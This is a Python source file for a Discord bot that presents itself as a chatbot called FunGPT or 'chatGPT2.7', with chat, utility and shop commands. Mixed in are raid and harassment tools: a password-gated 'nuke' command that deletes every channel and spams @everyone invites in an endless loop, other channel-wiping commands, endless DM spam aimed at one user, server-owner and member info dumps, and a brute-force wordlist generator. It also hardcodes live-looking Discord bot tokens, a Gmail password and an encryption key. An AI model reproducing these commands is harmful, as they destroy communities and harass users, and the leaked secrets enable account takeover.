from time import sleep
from keep_alive import keep_alive
from discord.ext import commands
import random as r
import requests
import discord
import smtplib
import itertools as its
import asyncio
import json
from replit import db
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.fernet import Fernet

intents = discord.Intents().all()



bot = commands.Bot(
	command_prefix="/",  # Change to desired prefix
	case_insensitive=True,  # Commands aren't case-sensitive
  intents=intents
)


#bot.author_id = 487258918465306634  # Change to your discord id!!!


client = discord.Client(intents=intents)

@bot.event 
async def on_ready():  # When the bot is ready
    print("I'm in")
    print(bot.user)  # Prints the bot's username and identifier


@bot.event
async def on_member_join(member):
    await member.send(f"{member} joined!!")
    channel = bot.get_channel(1141553069889441874)
    await channel.send(f"歡迎 {member.mention} 入伍！")

@bot.event
async def on_command_error(ctx,error):
  await ctx.send(error)

@client.event
async def on_message_delete(message):
    embed = discord.Embed(title="{} deleted a message".format(message.author.name),
                          description="", color=0xFF0000)
    embed.add_field(name=message.content, value="This is the message that he has deleted",inline=True)
    channel = client.get_channel(1170675006280306799)
    await channel.send(channel, embed=embed)

@client.event
async def on_message(message):
  if message.content == "Hey":
    await ctx.send("Hey")
  else:
    msg = ["你好","我的前綴是/","What happened?!","你有病吧！"]
    N_msg = r.choice(msg)
    await message.channel.send(N_msg)


@bot.command()
async def say_hello(ctx):
  await ctx.send("Hello,I am chatGPT2.7,how can I help you.")

@bot.command()
async def introduce(ctx):
  await ctx.send(f"{bot} Hello , I am chatGPT2.7,who was made by W Tech Inc.")

@bot.command()
async def ask12(ctx,*,arg1):
  if arg1 == "Can you say chinese?":
    await ctx.send("Sorry,I cannot.")

@bot.command()
async def chat(ctx,*,prompt : str):
  if prompt == "What can you do?":
    await ctx.send("Hello there,I know many about of things,but nowsaday, for my version,is not doing many things.")
  elif prompt == "Can you code with me?":
    await ctx.send("Of course no,because of my commands code place haven't many things.")
  elif prompt == "Can you write a story?":
    psg1 = """
    Man has bacon and eggs for breakfast’ is not a story idea that is going to have readers clawing for a copy of your book. It also is highly unlikely this would sustain an entire novel.
    """
    psg2 = """
    Exploring the rhythm of your writing consciously will help you to write better sentences. A book contains many sentences, so make yours easier and lovelier to read. Consciously crafted, creative prose makes a book better in any genre.
    """
    await ctx.send(psg1)
  elif prompt == "What food do you recommand?":
    await ctx.send("I recommand you eat some meat.")
  elif prompt == "What commands do you have?":
    await ctx.send("""
     I have:
     /chat <long argument> -- It can chat with me
     /ask12 <long argument> -- It only can ask me one question
     /say <argument> -- Anything do you want me to say
     /plus_math <arg1> <arg2> -- It can sum them.(Remember,the argument must be int.Otherwise, that will be error.)
    """)
  elif prompt == "Can you write a sentence?":
      Sub = ["I","You","We","They","He","She","It"]
      Obj = ["me.","you.","us.","them.","him.","her.","it."]
      verb = ["eat","drink","fight","kill"]
      S = r.choice(Sub)
      V = r.choice(verb)
      O = r.choice(Obj)
      await ctx.send(f"{S} {V} {O}")
  elif prompt == "你能寫一句句子嗎?":
       NS = ["他","她","他們","我們","我","你"]
       NO = ["他","她","他們","我們","我","你"]
       NV = ["吃"," 喝","打","殺"]
       NSub = r.choice(NS)
       NObj = r.choice(NO)
       NVerb = r.choice(NV)
       await ctx.send(f"{NSub} {NVerb} {NObj}。")
      
  elif prompt == "hello" or prompt == "hi":
    await ctx.send("Hello there,how cam I help you today?")
  elif prompt  == "Can you tell me a story?" or prompt == "story,please?":
    t = ["Today,","Yestasday,","One aspon a time,"]
    Sub = ["I","We","You","They","He","She","It"]
    Obj = ["me","you","them","us","him","it"]
    verb = ["eat","drink","fight","see"]
    new_time = r.choice(t)
    new_Sub = r.choice(Sub)
    new_Obj = r.choice(Obj)
    new_verb = r.choice(verb)
    if new_time == "Yestasday," or new_time == "One aspon a time,":
      verb = ["ate","droink","fighted","saw"]
      new_verb = r.choice(verb)
      sentence = f"{new_time} {new_Sub} {new_verb} {new_Obj},and {new_Sub} {new_verb} {new_Obj}."
      await ctx.send(sentence)
  else:
    await ctx.send("Sorry,I don't understand what are you talking about.")
    

@bot.command(pass_context = True)
async def say(ctx,*,arg1):
  await ctx.message.delete()
  await ctx.send(arg1)

@bot.command()
async def plus_math(ctx,arg1,arg2):
  try:
     num1 = int(arg1)
     num2 = int(arg2)
     ans = num1 + num2
     await ctx.send(f"The ans is {ans}")
  except ValueError:
    await ctx.send("你輸入的參數類型不正確。")

key = "DUBWKuYEugUex8ynVKm-7ctcUmwaV0u0JpzLkoka8_Q="

@bot.command()
async def build_API(ctx):
  fernet = Fernet(key)
  api_key = ["FunGPT","Random things for fun."]
  list_string = str(api_key)
  encrypted_data = fernet.encrypt(list_string.encode())
  await ctx.send(encrypted_data.decode())
  

@bot.command()
async def verify_user(ctx):
  view = MyView()
  await ctx.send(view=view)
  

@bot.command()
async def open_website(ctx):
  await ctx.send("http://50.62.160.141/plesk-site-preview/wangtry.org/")

@bot.command()
async def code(ctx,arg1):
   if arg1 == "html":
      await ctx.send("""
    <!doctype html>
    <html>
    <head>
    <title> Title name </title>
    <link rel="stylesheet" href="[Your CSS file source.]">
    </head>
    <body>
     <!-- type your want.-->
     <script src="[Your javascript file source.]"></script>
    </body>
  </html>
""")
   elif arg1 == "python":
      await ctx.send("""
     #print()
     print("[Your want]")
     #create&calling function
     def function_name(argument):
        pass
     function_name(argument)
     #create class object
     class Obj:
        def __init__(self,self_argument):
           self.self_argument = self_argument
        def self_function(self):
           pass
""")
   elif arg1 == "java":
     await ctx.send("""
     public Main {
         public static void main(String args[]) {
             //type your wants.
             //print()
             System.out.println();
             //create object() 建立對象 -- 用於calling function
             Main t = new Main();
             //you also can change t to other varable you want.
             t.otherFunction();
         }
     }
     """)
   elif arg1 == "c":
     await ctx.send("""
     #include <stdio.h>
     int main() {
        //your wants.
        //print()
        printf();
        //you also can type return 0; if you want,or not.
     }
     """)

@bot.command()
async def check_webCode(ctx,url):
  respone = requests.get(url)
  if len(respone.text) < 2000:
     await ctx.send(respone.text)
  else:
     await ctx.send("不能大於2000個字符。")

@bot.command()
async def stringLength(ctx,*,string):
  await ctx.send(len(string))

@bot.command()
async def say_badWord(ctx,arg1):
  if arg1 == "Cantonese":
    var = "屌你老母 芝士漢堡 屌你老豆 宿埋一舊 屌你家姐 落雨擔遮 屌你家姐 快過火車 屌你呀爺 笑口畸畸 屌你呀麻 泰國喇嘛屌你呀妹碌柒崩潰屌你阿哥 好過渣波 屌你屎忽化痰止咳 屌你個仔 屎忽扭計 屌你個咀 刷牙唔用涮口水 屌你老母仆街陷家產食屎收皮啦屌你. 戇撚鳩鳩食撚曬賓州咁屌你老母咁既仆街死樣. 吹撚脹? 你係生出黎俾我屌撚柒嫁啦仆街陷家產. 屌足你十世,屌你老母正仆街陷家產屌你祖宗十八代仆街含家產你老母生花柳"
    await ctx.send(var)

@bot.command()
async def delete_message(ctx):
  while True:
     await ctx.message.delete()

@bot.command()
async def 啟動轟炸機(ctx):
  while True:
    await ctx.send("Nuked.")
    await ctx.send("Nuked.")
    await ctx.send("Nuked.")

def check(ctx,message):
  return message.author == ctx.author and message.channel == ctx.channel

@bot.command()
async def verify(ctx):
  pw = "Zx1234"
  await ctx.send("請輸入密碼：")
  password = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=8)
  try:
    if password == pw:
      await ctx.send("檢查中")
      sleep(2)
      await ctx.send("驗證進行中")
      sleep(2)
      await ctx.send("通過泓技N1閘道中")
      sleep(2)
      await ctx.send("驗證成功")
      

    else:
      await ctx.send("密碼輸入錯誤")
  except ValueError:
    await ctx.send("沒有輸入密碼")

@bot.command()
async def nuke(ctx,password):
  await ctx.message.delete()
  pw = "WTech122"
  try:
    if password == pw:
      await ctx.send("檢查中")
      sleep(2)
      await ctx.send("驗證進行中")
      sleep(2)
      await ctx.send("通過泓技N1閘道中")
      sleep(2)
      await ctx.send("通過泓技 NS1.WTech.com 中")
      sleep(2)
      await ctx.send("通過泓技 server.WTech.com/get/nuke 中")
      sleep(2)
      await ctx.send("驗證成功，開始工作")
      guild = ctx.guild
      for channel in guild.channels:
        await channel.delete()
        while True:
          await guild.edit(name="美味貓戰區")
          await guild.create_text_channel("NUKED")
          for channel in guild.channels:
            await channel.send("@everyone, Hey !!! https://discord.gg/jRpWf3Ms")
            await channel.send("@everyone, Hey !!! https://discord.gg/jRpWf3Ms")
    else:
      await ctx.send("檢查中")
      sleep(2)
      await ctx.send("驗證進行中")
      sleep(2)
      await ctx.send("通過泓技N1閘道中")
      sleep(2)
      await ctx.send("通過泓技 NS1.WTech.com 中")
      sleep(2)
      await ctx.send("通過泓技 server.WTech.com/get/nuke 中")
      await ctx.send("通行密碼錯誤。 原因 ： N1:末能得到WTech.com/get/nuke/passNuke.json 許可。 N2:末能正確地得到WTech.com/getClient.js 的許可")
  except ValueError:
    await ctx.send("請輸入通行密碼")

@bot.command()
async def remove_nuke(ctx):
  guild = ctx.guild
  while True:
    for channel in guild.channels:
      await channel.delete()

@bot.command()
async def Done(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name="泓技工作室 W Tech")
  guild = ctx.guild
  for channel in guild.channels:
    await channel.delete()
    await guild.create_text_channel("公告")
    await guild.create_text_channel("規則")
    await guild.create_text_channel("抽獎區")
    await guild.create_text_channel("聊天室")
    await guild.create_text_channel("指令區")
    await guild.create_text_channel("W Tech會員")
    await guild.create_text_channel("《Uncle run》遊戲")
    await guild.create_text_channel("pet sim X")
    await guild.create_voice_channel("Voice Chat")
    await guild.create_voice_channel("Meeting room")
    await guild.create_text_channel("下單區")
    break


@bot.command()
async def productGame(ctx):
  await ctx.message.delete()
  await ctx.send("""
    @here, 本店將有遊戲放售，價格為 港幣55元。
  """)

@bot.command()
async def promote(ctx,discount,people):
  fomat = f"""
   @here, {people} 將會有{discount} 優惠。🎉🎉
  """
  await ctx.send(fomat)

@bot.command()
async def haha(ctx):
  await ctx.message.delete()
  await ctx.send(f"This server id is: {ctx.guild.id} And this server name is: {ctx.guild.name}")
  await ctx.send(f"Name: {ctx.guild.owner.name} And this id: {ctx.guild.owner.id}")

@bot.command()
async def returnAll(ctx):
  await ctx.guild.edit(name="中华人民解放軍 People's Liberation Army")
  while True:
    for channel in ctx.guild.channels:
      await channel.delete()
      await ctx.guild.create_text_channel("聊天室")
      await ctx.guild.create_text_channel("指令區")
      await ctx.guild.create_text_channel("正式公告")
      await ctx.guild.create_text_channel("訓練公告")
      await ctx.guild.create_text_channel("招募公告")
      await ctx.guild.create_text_channel("訓練結果")
      await ctx.guild.create_text_channel("招募結果")
      break
    break
  return False

@bot.command()
async def remove_message(ctx,password,amout):
  pw = "WTech"
  if password == pw:
    number = int(amout)
    await ctx.channel.purge(limit=number)
  else:
    await ctx.send("密碼錯誤")

@bot.command()
async def workTime(ctx,date,*,workThing):
  await ctx.message.delete()
  fp = open("boss_workTime.txt","a+")
  fomat = f"""
    議程： {workThing} 日期/時間: {date}
  """
  fp.write(fomat + "\n")
  await ctx.send("寫入成功！")

@bot.command()
async def checkProgramme(ctx):
  fp = open("boss_workTime.txt","r")
  await ctx.reply(fp.read())

@bot.command()
async def send_mail(ctx):
  await ctx.send("收件者：")
  reviewer = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=30)
  await ctx.send("主旨：")
  subject = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=30)
  await ctx.send("內容：")
  content = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=30)
  reviewer = reviewer.content
  subject = subject.content
  content = content.content
  s = smtplib.SMTP("smtp.gmail.com",587)
  s.starttls()
  s.login("1245server@gmail.com","jvbswpfesugcqazw")
  send_data = f"Subject: {subject} \n\n {content}"
  s.sendmail("1245server@gmail.com",reviewer,send_data)
  if True:
    await ctx.send("郵件已成功發送✅")
  else:
    await ctx.send("發送失敗")

@bot.command()
async def dm(ctx, member: discord.Member, *, content):
    await ctx.message.delete()
    #return False
    channel = await member.create_dm()
    await channel.send(content)

@bot.command()
async def Do(ctx,username):
    await ctx.message.delete()
    converter = commands.MemberConverter()
    user = await converter.convert(ctx, username)
    # 發送私信
    if user is not None:
        while True:
         await user.send("哈哈")

@bot.command()
async def warn(ctx,password,username):
  pw = "WTech"
  await ctx.send("檢查中")
  sleep(2)
  await ctx.send("驗證進行中")
  sleep(2)
  await ctx.send("通過泓技N1閘道中")
  sleep(2)
  await ctx.send("通過泓技 NS1.WTech.com 中")
  sleep(2)
  await ctx.send("通過泓技 server.WTech.com/get/* 中")
  await ctx.send("通行密碼錯誤。 原因 ： 末得到 server.WTech.com/get/All.js 許可")
  if password == pw:
    await ctx.reply(f"{username} 已被警告✅")
    converter = commands.MemberConverter()
    user = await converter.convert(ctx,username)
    await user.send("你已被警告✅")
  else:
    await ctx.reply("密碼錯誤")

@bot.command()
async def Em(ctx,title,*,description):
  embed = discord.Embed(title=title,description=description)
  await ctx.send(embed=embed)

@bot.command(name="helps")
async def aboutMe(ctx):
  Content = """
    我的前綴： /
    /chat <prompt> -- 聊天
    /dm <ping user> <content> -- 私聊
    /verify <password: Zx1234> -- 在泓技平台上驗證
    /remove_message <password> <amout> -- 刪信息
    /check_webCode <url> -- 查看網站代碼 （只限2000個字符串以下）
    /nuke <password> -- 炸群
  """
  embed = discord.Embed(title="FunGPT的使用指南:",description=Content)
  await ctx.send(embed=embed)

@bot.command()
async def greenbean(ctx,guild_id):
  guild = bot.get_guild(guild_id)  # 通过 ID 获取 Guild 对象
  if guild:
    for member in guild.members:
      await ctx.send(member.name)
    else:
      pass

class Stock:
  def __init__(self,name,price,amout,balance):
    self.name = name
    self.price = price
    self.amout = amout
    self.balance = balance
  def printAll(self):
    return self.name + " , " + self.amout
  def buy(self):
    if self.balance >= self.price:
      return "ok"
    else:
      return "You have not enough money."
  def sell(self):
    return "You get: R$" + self.price*self.amout

stock1 = Stock("W Tech",300,100,None)
stock2 = Stock("楓葉代刷",500,95,None)

@bot.command()
async def gen_pic(ctx):
  pic = ["IMG_1973.jpeg","IMG_3180.png","IMG_1737.jpeg"]
  picc = r.choice(pic)
  await ctx.send(file=discord.File(picc))

@bot.command()
async def checkPayment(ctx):
  await ctx.send("請輸入客戶名稱：")
  client = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=10)
  client = client.content
  db["lient"] = "Below:!."
  cl = "client"
  num = str(r.randint(102938,908717))
  c = cl + num
  prefix = f"client{client}{num}"
  db[c] = prefix
  await ctx.send("你的名稱已紀錄於泓技database")
  sleep(1.5)
  await ctx.send("請輸入購買項目：")
  product = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=8)
  await ctx.send("請輸入價錢：")
  price = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=8)
  price = int(price.content)
  await ctx.send("""
  請輸入付款方式:
  1 -- 泓幣
  2 -- 轉帳
  3 -- 超商 【目前沒有，將會有】
  """)
  payment = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=10)
  if payment.content == "1":
    await ctx.send(f"""
    以下是你的繳費資訊：
    訂購項目： {product.content}
    價錢： {price * 10}
    付款方式： 泓幣
""")
  elif payment.content == "2":
    await ctx.send(f"""
    以下是你的繳費資訊：
    訂購項目： {product.content}
    價錢： ~{price}
    付款方式： 轉帳
    """)
  else:
    await ctx.send("不好意思，輸入有誤")

@bot.command(pass_context=True)
@commands.is_owner()
async def dataBase(ctx):
  pr = db.prefix("c")
  for p in pr:
    fm = f"""
    泓技登記客戶如下
    格式： client_name+clientRandomNumber
    {db[p]}
    """
    await ctx.send(fm)

@bot.command()
async def pw(ctx):
  await ctx.send("""請選擇以下選項：
  1 -- 數字
  2 -- 英文字母
  """)
  choice = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=10)
  choice = int(choice.content)
  if choice == 1:
    words_num = "1234567890"
    r = its.product(words_num, repeat=4)#以建8位纯数字密码本为例
    for i in r:
      await ctx.send("".join(i))
  elif choice == 2:
    words_letter = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    r = its.product(words_letter, repeat=4)#以建8位纯数字密码本为例
    for i in r:
      await ctx.send("".join(i))
  else:
    await ctx.send("輸入有誤")

@bot.command()
async def en(ctx):
  await ctx.send("請輸入明文:")
  e = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=30)
  e = e.content

@bot.command()
async def de(ctx):
  await ctx.send("請輸入密文:")


  e = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=30)
  e = e.content
  # 生成RSA密钥对
  private_key = rsa.generate_private_key(
      public_exponent=65537,
      key_size=2048
  )
  public_key = private_key.public_key()

  # 将公钥序列化为PEM格式
  public_key_pem = public_key.public_bytes(
      encoding=serialization.Encoding.PEM,
      format=serialization.PublicFormat.SubjectPublicKeyInfo
  )

  # 将私钥序列化为PEM格式
  private_key_pem = private_key.private_bytes(
      encoding=serialization.Encoding.PEM,
      format=serialization.PrivateFormat.PKCS8,
      encryption_algorithm=serialization.NoEncryption()
  )

  # 打印公钥和私钥
  await ctx.send(f"公共鑰：{public_key_pem.decode('utf-8')}")

  # 解密数据
  decrypted_data = private_key.decrypt(
      e,
      padding.OAEP(
          mgf=padding.MGF1(algorithm=hashes.SHA256()),
          algorithm=hashes.SHA256(),
          label=None
      )
  )

  await ctx.send(f"解密后的结果： {decrypted_data.decode('utf-8')}")
  
@bot.command()
async def de_apiKey(ctx):
  key = "DUBWKuYEugUex8ynVKm-7ctcUmwaV0u0JpzLkoka8_Q="
  await ctx.send("請輸入泓技api key: ")
  token = await bot.wait_for("message",check=lambda message:check(ctx,message),timeout=30)
  tokenn = token.content
  fernet = Fernet(key)
  # 解密结果
  decrypted_data = fernet.decrypt(tokenn)
  await ctx.send(f"解密結果： {decrypted_data.decode()}")

      

extensions = [
	'cogs.cog_example'  # Same name as it would be if you were importing it
]
"""

if __name__ == '__main__':  # Ensures this is the file being ran
  """
"""
for extension in extensions:
		bot.load_extension(extension)  # Loades every extension."""
pass

keep_alive()  # Starts a webserver to be pinged.
#token = os.environ.get("DISCORD_BOT_SECRET") 
#bot.run(MTA5NjM4NjYyMzg1NzUwNDI1Nw.Gzy0o6.Xn4S17cnsxTI0Lopnt3PH2bQV7ly3VRqHEb-RI)  # Starts the bot

bot.run("MTA5NjM4NjYyMzg1NzUwNDI1Nw.G_ApxC.g5Sh-feVRRWq5Y8ayYJNnz5tH-bQQndfZknjZ8")
